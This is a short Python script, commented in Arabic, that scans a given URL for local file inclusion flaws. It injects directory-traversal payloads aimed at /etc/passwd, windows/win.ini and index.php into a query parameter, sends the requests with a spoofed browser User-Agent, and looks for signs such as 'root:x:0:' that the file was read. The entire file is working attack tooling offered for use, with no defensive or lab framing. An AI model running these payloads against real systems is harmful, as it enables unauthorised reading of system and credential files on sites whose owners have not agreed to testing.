import requests

def scan_lfi(url, param="file"):
    """
    يقوم بفحص الموقع لاكتشاف ثغرات LFI باستخدام طرق أكثر دقة.
    :param url: عنوان الموقع الذي تريد فحصه.
    :param param: اسم المعامل المراد حقنه (افتراضي: "file").
    """
    
    payloads = [
        "../../../../etc/passwd",
        "../../etc/passwd",
        "../../../etc/passwd",
        "../../../../windows/win.ini",
        "../../windows/win.ini",
        "../../../windows/win.ini",
        "../index.php",
        "../../index.php",
        "../../../../index.php"
    ]

    
    indicators = [
        "root:x:0:",  
        "[boot loader]",  
        "Fatal error",  
        "failed to open stream",  
        "No such file or directory"
    ]

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }

    for payload in payloads:
        target_url = f"{url}?{param}={payload}"
        try:
            print(f"[*] تجربة الحمولة: {payload}")
            response = requests.get(target_url, headers=headers)

            # فحص المؤشرات في نص الرد
            for indicator in indicators:
                if indicator.lower() in response.text.lower():
                    print(f"[+] تم اكتشاف ثغرة LFI عند: {target_url} - المؤشر: {indicator}")
                    break
            else:
                print(f"[-] لم يتم اكتشاف ثغرة LFI عند: {target_url}")

        except requests.exceptions.RequestException as e:
            print(f"[!] خطأ أثناء الاتصال بـ {target_url}: {e}")
